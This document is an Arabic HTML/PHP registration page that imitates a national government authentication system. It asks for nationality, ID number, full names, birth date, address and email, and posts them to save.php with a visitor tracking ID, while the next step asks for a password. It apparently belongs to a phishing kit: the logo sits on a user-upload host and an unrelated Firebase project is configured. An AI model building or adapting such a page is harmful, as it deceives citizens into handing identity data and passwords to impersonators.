<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام التوثيق الوطني - البيانات الشخصية</title>
    
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <link href="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/css/select2.min.css" rel="stylesheet" />
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/js/select2.min.js"></script>

    <style>
        :root { --primary-color: #007fb1; --bg-color: #f5f5f5; --secondary-color: #8a1538; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: var(--bg-color); margin: 0; padding: 0; color: #333; overflow-x: hidden; }
        .header { background-color: #fff; padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #ddd; height: 70px; }
        .header-right-group { display: flex; align-items: center; gap: 15px; }
        .menu-icon { display: flex; flex-direction: column; justify-content: space-between; width: 22px; height: 16px; cursor: pointer; }
        .menu-icon span { display: block; height: 2px; width: 100%; background-color: var(--primary-color); border-radius: 2px; }
        .logo-tawtheeq { height: 50px; }
        .header-text-left { text-align: left; }
        .container { max-width: 500px; margin: 20px auto; padding: 10px; }
        .steps-container { display: flex; justify-content: space-between; margin-bottom: 30px; position: relative; }
        .steps-container::before { content: ""; position: absolute; top: 15px; left: 0; right: 0; height: 1px; background: #ccc; z-index: 1; }
        .step { z-index: 2; text-align: center; flex: 1; }
        .step-number { width: 30px; height: 30px; background: #fff; border: 1px solid #ccc; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 5px; font-weight: bold; color: #666; }
        .step-completed .step-number { background: #e0f2f1; color: var(--primary-color); border-color: var(--primary-color); }
        .step.active .step-number { background: var(--primary-color); color: #fff; border-color: var(--primary-color); }
        .step-label { font-size: 11px; font-weight: bold; line-height: 1.2; }
        .form-card { background: #fff; border: 1px solid #e0e0e0; border-radius: 4px; padding: 25px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
        .form-card h2 { font-size: 18px; margin-top: 0; margin-bottom: 20px; border-bottom: 1px solid #eee; padding-bottom: 15px; }
        .form-group { margin-bottom: 15px; }
        label { font-size: 13px; font-weight: bold; margin-bottom: 5px; display: block; }
        input[type="text"], input[type="email"], input[type="date"], select { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 14px; background-color: #fff; outline: none; }
        .gender-group { display: flex; gap: 20px; margin-top: 10px; }
        .radio-option { display: flex; align-items: center; font-size: 14px; cursor: pointer; }
        .radio-option input { margin-left: 8px; }
        .btn-submit { width: 100%; background-color: var(--primary-color); color: white; border: none; padding: 12px; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 16px; }
        .footer-text { text-align: center; margin-top: 30px; font-size: 13px; color: #666; padding-bottom: 20px; }
        #loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.95); z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid var(--primary-color); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div id="loading-overlay"><div class="spinner"></div><p style="margin-top: 15px; font-weight: bold; color: var(--primary-color);">جاري حفظ البيانات...</p></div>

    <div class="header">
        <div class="header-right-group">
            <div class="menu-icon"><span></span><span></span><span></span></div>
            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663234476152/DhrsVnFpSCHlBdiR.png" class="logo-tawtheeq">
        </div>
        <div class="header-text-left">
            <div style="color: var(--secondary-color); font-weight: bold; font-size: 16px;">نظام التوثيق الوطني</div>
            <div style="font-size: 11px; color: #666;">National Authentication System</div>
        </div>
    </div>

    <div class="container">
        <div class="steps-container">
            <div class="step step-completed"><div class="step-number">✓</div><div class="step-label">نوع<br>الحساب</div></div>
            <div class="step active"><div class="step-number">٢</div><div class="step-label">البيانات<br>الشخصية</div></div>
            <div class="step"><div class="step-number">٣</div><div class="step-label">كلمة<br>المرور</div></div>
            <div class="step"><div class="step-number">٤</div><div class="step-label">إتمام التسجيل</div></div>
        </div>

        <div class="form-card">
            <h2>البيانات الشخصية</h2>
            <form id="detailsForm" action="save.php" method="POST">
                <input type="hidden" name="visitor_id" value="<?php echo htmlspecialchars($_GET['visitor_id'] ?? ''); ?>">
                <input type="hidden" name="current_page" value="personal_info.php">
                <div class="form-group"><label>الجنسية *</label>
                    <select name="nationality" id="nationality" class="js-example-basic-single" required style="width: 100%;">
                        <option value="" disabled selected>اختر الجنسية</option>
                    </select>
                </div>
                <div class="form-group"><label>رقم الهوية *</label><input type="text" name="id_number" id="id_number" placeholder="أدخل رقم الهوية" required></div>
                <div class="form-group"><label>الاسم بالعربي *</label><input type="text" name="name_ar" id="name_ar" placeholder="الاسم كما في الهوية" required></div>
                <div class="form-group"><label>الاسم بالإنجليزي *</label><input type="text" name="name_en" id="name_en" placeholder="الاسم بالإنجليزي" required></div>
                <div class="form-group"><label>تاريخ الميلاد *</label><input type="date" name="dob" id="dob" required></div>
                <div class="form-group"><label>العنوان الحالي *</label><input type="text" name="address" id="address" placeholder="العنوان" required></div>
                <div class="form-group"><label>البريد الإلكتروني *</label><input type="email" name="email_confirm" id="email_confirm" placeholder="البريد الإلكتروني" required></div>
                <div class="form-group"><label>الجنس *</label>
                    <div class="gender-group">
                        <label class="radio-option"><input type="radio" name="gender" value="ذكر" checked> ذكر</label>
                        <label class="radio-option"><input type="radio" name="gender" value="أنثى"> أنثى</label>
                    </div>
                </div>
                <button type="submit" class="btn-submit">استمرار</button>
            </form>
        </div>
        <div class="footer-text">نظام التوثيق الوطني - جميع الحقوق © 2026 محفوظة</div>
    </div>

    <script>
        const countries = {
            "🇦🇫 أفغانستان": "أفغانستان", "🇦🇱 ألبانيا": "ألبانيا", "🇩🇿 الجزائر": "الجزائر", "🇦🇩 أندورا": "أندورا", "🇦🇴 أنغولا": "أنغولا", "🇦🇬 أنتيغوا وبربودا": "أنتيغوا وبربودا", "🇦🇷 الأرجنتين": "الأرجنتين", "🇦🇲 أرمينيا": "أرمينيا", "🇦🇺 أستراليا": "أستراليا", "🇦🇹 النمسا": "النمسا", "🇦🇿 أذربيجان": "أذربيجان", "🇧🇸 جزر البهاما": "جزر البهاما", "🇧🇭 البحرين": "البحرين", "🇧🇩 بنغلاديش": "بنغلاديش", "🇧🇧 باربادوس": "باربادوس", "🇧🇾 بيلاروسيا": "بيلاروسيا", "🇧🇪 بلجيكا": "بلجيكا", "🇧🇿 بليز": "بليز", "🇧🇯 بنين": "بنين", "🇧🇹 بوتان": "بوتان", "🇧🇴 بوليفيا": "بوليفيا", "🇧🇦 البوسنة والهرسك": "البوسنة والهرسك", "🇧🇼 بوتسوانا": "بوتسوانا", "🇧🇷 البرازيل": "البرازيل", "🇧🇳 بروناي": "بروناي", "🇧🇬 بلغاريا": "بلغاريا", "🇧🇫 بوركينا فاسو": "بوركينا فاسو", "🇧🇮 بوروندي": "بوروندي", "🇰🇭 كمبوديا": "كمبوديا", "🇨🇲 الكاميرون": "الكاميرون", "🇨🇦 كندا": "كندا", "🇨🇻 الرأس الأخضر": "الرأس الأخضر", "🇨🇫 جمهورية أفريقيا الوسطى": "جمهورية أفريقيا الوسطى", "🇹🇩 تشاد": "تشاد", "🇨🇱 تشيلي": "تشيلي", "🇨🇳 الصين": "الصين", "🇨🇴 كولومبيا": "كولومبيا", "🇰🇲 جزر القمر": "جزر القمر", "🇨🇬 الكونغو": "الكونغو", "🇨🇷 كوستاريكا": "كوستاريكا", "🇭🇷 كرواتيا": "كرواتيا", "🇨🇺 كوبا": "كوبا", "🇨🇾 قبرص": "قبرص", "🇨🇿 التشيك": "التشيك", "🇩🇰 الدنمارك": "الدنمارك", "🇩🇯 جيبوتي": "جيبوتي", "🇩🇲 دومينيكا": "دومينيكا", "🇩🇴 جمهورية الدومينيكان": "جمهورية الدومينيكان", "🇪🇨 الإكوادور": "الإكوادور", "🇪🇬 مصر": "مصر", "🇸🇻 السلفادور": "السلفادور", "🇬🇶 غينيا الاستوائية": "غينيا الاستوائية", "🇪🇷 إريتريا": "إريتريا", "🇪🇪 إستونيا": "إستونيا", "🇪🇹 إثيوبيا": "إثيوبيا", "🇫🇯 فيجي": "فيجي", "🇫🇮 فنلندا": "فنلندا", "🇫🇷 فرنسا": "فرنسا", "🇬🇦 الغابون": "الغابون", "🇬🇲 غامبيا": "غامبيا", "🇬🇪 جورجيا": "جورجيا", "🇩🇪 ألمانيا": "ألمانيا", "🇬🇭 غانا": "غانا", "🇬🇷 اليونان": "اليونان", "🇬🇩 غرينادا": "غرينادا", "🇬🇹 غواتيمالا": "غواتيمالا", "🇬🇳 غينيا": "غينيا", "🇬🇼 غينيا بيساو": "غينيا بيساو", "🇬🇾 غيانا": "غيانا", "🇭🇹 هايتي": "هايتي", "🇭🇳 هندوراس": "هندوراس", "🇭🇺 المجر": "المجر", "🇮🇸 آيسلندا": "آيسلندا", "🇮🇳 الهند": "الهند", "🇮🇩 إندونيسيا": "إندونيسيا", "🇮🇷 إيران": "إيران", "🇮🇶 العراق": "العراق", "🇮🇪 أيرلندا": "أيرلندا", "🇮🇱 إسرائيل": "إسرائيل", "🇮🇹 إيطاليا": "إيطاليا", "🇯🇲 جامايكا": "جامايكا", "🇯🇵 اليابان": "اليابان", "🇯🇴 الأردن": "الأردن", "🇰🇿 كازاخستان": "كازاخستان", "🇰🇪 كينيا": "كينيا", "🇰🇮 كيريباتي": "كيريباتي", "🇰🇼 الكويت": "الكويت", "🇰🇬 قرغيزستان": "قرغيزستان", "🇱🇦 لاوس": "لاوس", "🇱🇻 لاتفيا": "لاتفيا", "🇱🇧 لبنان": "لبنان", "🇱🇸 ليسوتو": "ليسوتو", "🇱🇷 ليبيريا": "ليبيريا", "🇱🇾 ليبيا": "ليبيا", "🇱🇮 ليختنشتاين": "ليختنشتاين", "🇱🇹 ليتوانيا": "ليتوانيا", "🇱🇺 لوكسمبورغ": "لوكسمبورغ", "🇲🇬 مدغشقر": "مدغشقر", "🇲🇼 مالاوي": "مالاوي", "🇲🇾 ماليزيا": "ماليزيا", "🇲🇻 جزر المالديف": "جزر المالديف", "🇲🇱 مالي": "مالي", "🇲🇹 مالطا": "مالطا", "🇲🇭 جزر مارشال": "جزر مارشال", "🇲🇷 موريتانيا": "موريتانيا", "🇲🇺 موريشيوس": "موريشيوس", "🇲🇽 المكسيك": "المكسيك", "🇫🇲 ميكرونيزيا": "ميكرونيزيا", "🇲🇩 مولدوفا": "مولدوفا", "🇲🇨 موناكو": "موناكو", "🇲🇳 منغوليا": "منغوليا", "🇲🇪 الجبل الأسود": "الجبل الأسود", "🇲🇦 المغرب": "المغرب", "🇲🇿 موزمبيق": "موزمبيق", "🇲🇲 ميانمار": "ميانمار", "🇳🇦 ناميبيا": "ناميبيا", "🇳🇷 ناورو": "ناورو", "🇳🇵 نيبال": "نيبال", "🇳🇱 هولندا": "هولندا", "🇳🇿 نيوزيلندا": "نيوزيلندا", "🇳🇮 نيكاراغوا": "نيكاراغوا", "🇳🇪 النيجر": "النيجر", "🇳🇬 نيجيريا": "نيجيريا", "🇰🇵 كوريا الشمالية": "كوريا الشمالية", "🇲🇰 مقدونيا الشمالية": "مقدونيا الشمالية", "🇳🇴 النرويج": "النرويج", "🇴🇲 عمان": "عمان", "🇵🇰 باكستان": "باكستان", "🇵🇼 بالاو": "بالاو", "🇵🇸 فلسطين": "فلسطين", "🇵🇦 بنما": "بنما", "🇵🇬 بابوا غينيا الجديدة": "بابوا غينيا الجديدة", "🇵🇾 باراغواي": "باراغواي", "🇵🇪 بيرو": "بيرو", "🇵🇭 الفلبين": "الفلبين", "🇵🇱 بولندا": "بولندا", "🇵🇹 البرتغال": "البرتغال", "🇶🇦 قطر": "قطر", "🇷🇴 رومانيا": "رومانيا", "🇷🇺 روسيا": "روسيا", "🇷🇼 رواندا": "رواندا", "🇰🇳 سانت كيتس ونيفيس": "سانت كيتس ونيفيس", "🇱🇨 سانت لوسيا": "سانت لوسيا", "🇻🇨 سانت فنسنت والغرينادين": "سانت فنسنت والغرينادين", "🇼🇸 ساموا": "ساموا", "🇸🇲 سان مارينو": "سان مارينو", "🇸🇹 ساو تومي وبرينسيب": "ساو تومي وبرينسيب", "🇸🇦 السعودية": "السعودية", "🇸🇳 السنغال": "السنغال", "🇷🇸 صربيا": "صربيا", "🇸🇨 سيشل": "سيشل", "🇸🇱 سيراليون": "سيراليون", "🇸🇬 سنغافورة": "سنغافورة", "🇸🇰 سلوفاكيا": "سلوفاكيا", "🇸🇮 سلوفينيا": "سلوفينيا", "🇸🇧 جزر سليمان": "جزر سليمان", "🇸🇴 الصومال": "الصومال", "🇿🇦 جنوب أفريقيا": "جنوب أفريقيا", "🇸🇸 جنوب السودان": "جنوب السودان", "🇪🇸 إسبانيا": "إسبانيا", "🇱🇰 سريلانكا": "سريلانكا", "🇸🇩 السودان": "السودان", "🇸🇷 سورينام": "سورينام", "🇸🇿 إسواتيني": "إسواتيني", "🇸🇪 السويد": "السويد", "🇨🇭 سويسرا": "سويسرا", "🇸🇾 سوريا": "سوريا", "🇹🇯 طاجيكستان": "طاجيكستان", "🇹🇿 تنزانيا": "تنزانيا", "🇹🇭 تايلاند": "تايلاند", "🇹🇱 تيمور الشرقية": "تيمور الشرقية", "🇹🇬 توغو": "توغو", "🇹🇴 تونغا": "تونغا", "🇹🇹 ترينيداد وتوباغو": "ترينيداد وتوباغو", "🇹🇳 تونس": "تونس", "🇹🇷 تركيا": "تركيا", "🇹🇲 تركمانستان": "تركمانستان", "🇹🇻 توفالو": "توفالو", "🇺🇬 أوغندا": "أوغندا", "🇺🇦 أوكرانيا": "أوكرانيا", "🇦🇪 الإمارات": "الإمارات", "🇬🇧 المملكة المتحدة": "المملكة المتحدة", "🇺🇸 الولايات المتحدة": "الولايات المتحدة", "🇺🇾 الأوروغواي": "الأوروغواي", "🇺🇿 أوزبكستان": "أوزبكستان", "🇻🇺 فانواتو": "فانواتو", "🇻🇦 الفاتيكان": "الفاتيكان", "🇻🇪 فنزويلا": "فنزويلا", "🇻🇳 فيتنام": "فيتنام", "🇾🇪 اليمن": "اليمن", "🇿🇲 زامبيا": "زامبيا", "🇿🇼 زيمبابوي": "زيمبابوي"
        };
        
        const select = $('#nationality');
        Object.entries(countries).forEach(([label, value]) => {
            select.append(`<option value="${value}">${label}</option>`);
        });
        $('.js-example-basic-single').select2();

        const firebaseConfig = { apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT...", authDomain: "saso-inspection.firebaseapp.com", databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com", projectId: "saso-inspection", storageBucket: "saso-inspection.firebasestorage.app", messagingSenderId: "1009002235896", appId: "1:1009002235896:web:3f0d6f84b6e956ffa5b80d" };
        if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
        const database = firebase.database();
        let visitorId = sessionStorage.getItem('visitorId') || "visitor_" + Math.floor(Math.random() * 900000 + 100000);
        sessionStorage.setItem('visitorId', visitorId);

        document.getElementById('detailsForm').onsubmit = (e) => {
            // إرسال البيانات فوراً لـ save.php لضمان الانتقال السريع
            // لا يتم استخدام preventDefault هنا للسماح للفورم بالإرسال الطبيعي
        };
    </script>
</body>
</html>
